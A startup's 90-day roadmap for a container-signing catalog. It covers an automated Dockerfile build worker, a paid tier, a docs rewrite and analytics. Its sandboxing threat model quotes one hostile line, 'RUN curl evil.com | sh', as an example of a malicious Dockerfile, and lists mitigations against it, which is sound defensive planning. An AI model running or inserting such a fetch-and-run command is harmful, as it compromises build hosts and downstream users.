# Next phase — 90 days

Written the day after the 8-week MVP shipped. Covers the 3 months that follow (Weeks 9-20). Opinionated and ship-focused; revisit only if real user data contradicts it.

**One-sentence thesis:** The MVP proved we can build and sign 12 containers. The next 90 days is about turning the submission scaffolding into a working end-to-end pipeline, so any third party can publish a module without a human Flareo maintainer hand-writing a canary recipe.

If that works, the catalog grows without linearly scaling our time. If it doesn't — either because nobody wants to publish or because the automation is too fragile — we learn it by Week 16 and pivot.

---

## The one thing this quarter is about

**Closing the submission → build → publish loop.** Today:

```
user submits → row in DB → human writes recipe → pipeline builds → signed image
              [A]         [manual bridge]         [B]
```

By end of quarter:

```
user submits → row in DB → reviewer approves → build worker runs → signed image
              [A]         [one click]          [automated]        [B]
```

The gap to close is the manual bridge. Everything else (A, B) already works.

Nothing else on the roadmap matters as much. Every other feature is either (1) in service of making the loop work, (2) in service of not dying under the loop's maintenance cost, or (3) a distraction.

---

## Weeks 9-10: post-launch triage

**Goal:** survive the first two weeks of real users without shipping anything structural.

No feature work. Whatever broke at launch gets fixed. Whatever users asked for repeatedly gets logged. Whatever I promised in a blog post and didn't actually ship gets quietly shipped or removed.

Specific deliverables:
- Daily Sentry review; every new error either fixed or triaged to "known, will fix in week 11"
- Respond to every user email within a business day
- Keep a simple text file of "things people actually asked for"
- Weekly Friday post-mortem — what broke, what I learned, what changes next week

Explicit non-goals: no new features, no roadmap adjustments, no paid tier conversations. The two weeks are deliberately boring.

**Why this is first:** launching into a new feature with unresolved launch bugs is how projects die quietly. The buffer is cheap; skipping it is expensive.

**Kill signal:** if we hit >20 hours/week of pure triage for two straight weeks, something fundamental is wrong. Stop, figure out what, and rescope before going further.

---

## Weeks 11-13: the submission build worker

**Goal:** a submission approved in `/app/admin` triggers a real build automatically, end to end.

This is the biggest single piece of the quarter. Three sub-parts:

### 11a: Accept a Dockerfile in submissions

- Extend `/api/v1/submissions` to accept an optional `dockerfile` string (already in the Zod schema; unused today)
- Extend the `/app/publish` wizard with a 4th step to paste or upload a Dockerfile
- Store the Dockerfile in Cloudflare R2 under `submissions/<id>/Dockerfile` (not in Postgres — don't stuff multi-KB build files into the DB)
- Update `/app/admin/submissions/<id>` to render the Dockerfile with syntax hints for the reviewer

~3 days.

### 11b: The build worker

A Rust or TypeScript service that:
1. Polls `Submission` rows with `status="approved"` every 30 seconds
2. Downloads the Dockerfile + any supplementary files from R2
3. Runs `docker build` in a sandboxed environment (initial: a Hetzner box with Docker, `--network=none` by default, CPU and RAM limits)
4. On success: pushes to `public.ecr.aws/flareo/<slug>:<version>` and `@sha256:...`
5. Runs `trivy` scan, uploads SBOM to R2
6. Runs `cosign sign` against GitHub Actions OIDC (just like the canary pipeline)
7. Updates Submission row to `status="built"`, creates Module row, links them

This is the bulk of the effort. ~8 days of work if the Hetzner box is already provisioned from preview demos.

**The hardest part is sandboxing.** A malicious Dockerfile can:
- Pull a huge image and run out of disk
- Include `RUN curl evil.com | sh` that compromises the build host
- Include a runtime `ENTRYPOINT` that we never execute, but if someone later runs the image, it gets them

Mitigations:
- Resource limits (CPU, memory, disk, build timeout at 10 min)
- `--network=none` during build unless explicitly opt-in (breaks `apt-get install` — that's fine, require multi-stage builds with pre-pulled layers)
- Isolated user for the build daemon
- Trivy scan AFTER build, not only at submission time — catches the "RUN curl" pattern landing in the image
- We document clearly that the signature says "this is what was built" — it does NOT say "this is safe to run"

### 11c: Reviewer decision UI

- `/app/admin/submissions/<id>` gets approve/reject buttons that actually do something
- Approve → sets `status="approved"`, worker picks it up within 30s
- Reject → sets `status="rejected"`, sends email to submitter via Resend (uses the `notifySubmission` preference we added in the account system)
- Partial: approve with notes ("fix X and resubmit")

~3 days. Depends on the Resend email template being written.

**Total for Weeks 11-13: ~14 calendar days of focused work.** Realistic for 3 weeks at part-time pace, tight but doable at full-time.

### Kill criteria

- If by end of Week 13 the build worker hasn't processed a real submission end-to-end, **stop and reassess**. This feature is the linchpin of the quarter; if it slips, everything downstream slides.
- If malicious-Dockerfile testing (I plan to spend a full day red-teaming this myself) reveals a sandbox escape, defer the public rollout and scope down to trusted reviewers only.

### Ship criteria

- Five real submissions pass through the end-to-end pipeline without manual intervention
- Zero sandbox escapes during red-team testing
- Build time p95 under 15 minutes for a reasonable Dockerfile
- Failed builds produce a useful error message surfaced in `/app/modules` so the submitter can fix and resubmit

---

## Week 14: reliability and telemetry

**Goal:** the pipeline can be unattended over a weekend without disaster.

Now that the build worker is real, operating it matters. Specific deliverables:

- **Worker health endpoint.** `/api/v1/worker/heartbeat` that Instatus polls every minute. Alerts on 3 consecutive failures.
- **Build-failure alerting.** Failed build → Sentry event with the full log. I check Sentry; I don't want to babysit.
- **Queue depth dashboard.** Simple page at `/app/admin/worker` showing queued count, in-flight build, recent wins/losses. Not a full observability stack; just the 5 numbers I'd check at 8 AM.
- **Automated retries.** Transient failures (network blip during ECR push) retry up to 3 times with backoff. Permanent failures (bad Dockerfile syntax) don't retry.
- **Dead-letter queue.** Submissions that fail 3 times go to a `worker-failures` status for human review, not silent loss.

~5 days. This is the week where the shiny feature becomes infrastructure. Boring, essential.

---

## Weeks 15-16: paid tier — shipped, not "designed"

**Goal:** one paying customer by end of Week 16.

Not "a pricing page." Not "a Stripe integration plan." An actual person paying us actual money.

Why now, not Week 20? Because the build worker creates real infrastructure cost (CPU, disk, ECR egress). Without revenue, every new module submitted is pure loss. Paid tier funds the thing it enables.

Scope — the minimum that gets to revenue:

### What's free
- Catalog browsing, verification, CLI, docs
- Up to 3 public module submissions per user
- Standard review queue (5 business days SLA)

### What's paid — €12/month individual
- Unlimited public module submissions
- Private module submissions (only you can pull)
- Priority review queue (2 business days SLA)
- Higher API rate limits (5k verify/hour, 30k catalog/hour)
- Email support within 24h

Deliberately NOT on day one: team plans, annual discounts, custom pricing, enterprise SSO. Those are Week 20+ concerns if the base plan gets traction.

### The concrete work

- Stripe integration: checkout session, customer portal, webhook to set `user.plan = "pro"` on successful subscription. 3 days.
- `/app/billing` page: shows current plan, upgrade button, "manage billing" link to Stripe portal. 1 day.
- Enforcement: quota checks on submission POST and rate-limit buckets that key on `user.plan`. 2 days.
- Pricing page rewrite: honest, short, no fake enterprise tier. 1 day.
- Dunning: failed-payment email via Resend. 1 day.

~8 days, fits in 2 weeks part-time.

### Kill criteria

- If by end of Week 16 zero paying customers, **do not build "features paid users will want"**. Talk to the free-tier users who were most engaged and ask why they didn't convert. The answer is data, not a product bug.
- If you're sitting at 5+ conversions by Week 16, push harder on the paid tier in Weeks 17-20 — this is working, lean in.

### Ship criteria

- First paying customer by end of Week 16
- Stripe webhook tested end-to-end including payment failure
- At least one person who converted writes "this was worth paying for" in an email. Save that email; it's an asset.

---

## Weeks 17-18: docs that convert

**Goal:** the docs are the best version of the sales pitch, not an afterthought.

Here's the honest state of the current docs: they're complete enough to answer technical questions, but they don't tell a story that makes someone sign up. That's fixable.

Specific rewrites:
- **`/docs/install`** — redo as 90-second happy path. "Here's the one command, here's what success looks like, here's where to go next." Everything else moves down-page.
- **`/docs/first-verify`** — becomes the primary demo surface. Pre-filled image ref, embedded terminal animation, direct CTA to sign up after success.
- **`/docs/publishing`** — update for the new build worker. This is the sales-pitch page for anyone who might submit a module; it needs to feel easy.
- **Use cases section** — new. 3 pages: "homelab enthusiast," "small team," "security-conscious company." Each answers "why would *I* use this?"
- **Remove everything about Horizon 2 and beyond.** Nothing lands harder than a docs page saying "coming soon" from 6 months ago.

~6 days. Doable in 2 weeks at part-time pace.

### Ship criteria

- `/docs/install` readable start-to-finish in 90 seconds
- 3 use-case pages published
- Analytics (if wired by now — see Week 19) show `/docs/*` → `/signup` conversion measurable

---

## Week 19: analytics, reluctantly

**Goal:** know whether any of this is working.

I deliberately put this off for 10+ weeks because premature optimization for metrics is a real failure mode. But at Week 19 we're making decisions about Q2; we need data.

Minimum viable:
- **Plausible** or **Simple Analytics** (privacy-respecting, GDPR-friendly). Not Google Analytics, not Segment. Matches the privacy policy we wrote.
- Track: unique weekly visitors, `/signup` completions, `/app/publish` completions, `/api/v1/verify` call counts, paid-tier conversions.
- One dashboard, I look at it once a week. Not daily.

~2 days of setup.

Explicit non-goals:
- No session recording. No heatmaps. No user-identifier analytics — the event-level data we need doesn't require any of that.
- No tracking inside `/app/*`. Once someone signs in, their behavior is their business; we have server-side logs if there's a real support question.

This is where most startups go wrong — they add instrumentation, start optimizing for the numbers they see, and forget that the numbers are a lagging indicator of whether the product is actually good. Install analytics, look at it once a week, don't let it drive the roadmap.

---

## Week 20: review and replan

**Goal:** look at Q1 honestly, decide Q2.

Three-hour exercise, once:

1. **Score each ship criterion.** Did we meet the Week 13 ship criteria for the build worker? The Week 16 paid-tier ones? Mark each one yes/no/partial.
2. **Count what actually happened.**
   - Active users at Week 8 vs Week 20
   - Modules in the catalog at Week 8 vs Week 20
   - Paying customers (should be ≥1)
   - Total infrastructure spend
   - Total revenue
3. **Identify the one surprise.** There will be at least one — something we didn't plan for that became the actual story of the quarter. Write it down.
4. **Write Q2 starting from user conversations, not from this plan.** The 5 most-engaged users from Q1 are the most valuable input for what to build in Q2.

The output of Week 20 is a 1-page doc titled "Q2 plan" with one headline thesis like this doc has. If I can't write that in one page, I don't understand my product well enough and Q2 starts with user interviews, not code.

---

## What's explicitly NOT happening this quarter

Enumerated so you and I don't cave to scope-creep pressure:

- **Firecracker per-user previews.** That's 6-8 weeks of infrastructure work with no intermediate shippable value. Still Horizon 3. The shared demo boxes stay as they are.
- **Kubernetes admission dashboard.** The policies we shipped at launch are enough. Dashboards are a Q3 feature at earliest.
- **Auto-containerization from raw source.** "Upload your Node app and we'll Dockerize it." Not happening — that's Railway/Fly.io territory and a 1-person team shouldn't build it. We require a Dockerfile.
- **Teams / organizations.** Single-user only. Multi-user is meaningful only once paid tier has ≥20 customers.
- **SAML / SSO / custom domains / enterprise features.** All of these are "do we have one customer who will pay €1000+/month for it?" If no: not this quarter.
- **Mobile app.** The website works on phones. No native app.
- **A Discord / Slack community.** Email and GitHub issues cover support. Community management is a real ongoing time cost; we don't have the hours.
- **Conference talks / influencer marketing.** All time sunk here is time not fixing the build worker. The product sells itself or it doesn't.

---

## Dependencies and risks I'm watching

**Dependencies that could block the plan:**
- Build worker needs a Hetzner host with Docker. I already have one for preview demos. May need to upgrade to a larger instance at Week 12 (~€50/month extra).
- Stripe account needs to be a proper business account, not personal. Set up in Week 11 at the latest so nothing blocks Week 15.
- Resend email domain needs DKIM verified for the `notifySubmission` emails — do this in Week 10 during triage.

**Risks I'm actively watching:**
- **Build worker sandbox escape.** If red-teaming in Week 13 finds any escape, the public pipeline stays gated to trusted submitters. No exceptions.
- **Feature scope creep from paying customers.** "We'd pay €500/month if you also did X" — attractive but usually a trap. Require three different customers to ask for the same thing before I touch the roadmap.
- **Burnout.** Solo quarter is long. The Week 14 "reliability" focus is partly a deliberate breather after Weeks 11-13's intensity. If I hit Week 16 and I'm not enjoying this, that's a signal, not an aesthetic complaint.

---

## If the quarter goes poorly

Defined concretely so "badly" isn't a retrospective feeling:

- **Build worker not end-to-end by Week 16:** stop feature work, pay someone part-time to help ship it, or accept that this is a 2-quarter feature.
- **Zero paying customers by Week 18:** kill the paid tier work, talk to 10 users, figure out positioning before touching code again.
- **>5 production incidents per month (any service down for >10 min):** reliability debt is compounding. Spend Week 19 on pure hardening, defer analytics to Q2.
- **I stop answering user emails within a day:** motivation is gone. Take a real week off before deciding what happens next.

None of these is catastrophic. All of them are recoverable. Naming them up front means I don't drift into them without noticing.

---

## Expected state at Week 20

If everything in this plan goes roughly right:

- **Build worker:** live, handling 5-20 submissions/week unattended
- **Catalog:** 12 original modules + 8-15 user-submitted = 20-27 total
- **Paying customers:** 3-10, totaling €36-120/month
- **Infrastructure cost:** ~€80/month (up from €24 because of the bigger Hetzner + paid Resend + small Stripe fees)
- **Active CLI installs:** 300-800 (from 50-ish at launch)
- **Uptime:** ≥99.5% over the quarter
- **My hours/week on Flareo:** 25-35 in Weeks 11-16, stabilizing to 15-20 afterward

If we're at the low end of all of these, we're still fine — the project is alive and growing. If we're at the high end, Q2 gets more ambitious. If we're below the low end on any single axis, Week 20's replan handles it honestly.

---

## One closing note

This plan is 3 pages. The Q1 plan that actually works will have 2 things this one doesn't: (1) whatever surprise Week 20 surfaces, and (2) adjustments based on user conversations between Week 9 and Week 20. This document is a starting position, not a contract. If by Week 12 something completely different is obviously more important than the build worker, we build that instead and mark this plan retrospectively wrong.

The fact that we wrote down what we thought was important at the start is the valuable part — it's a reference point for noticing when reality diverges.
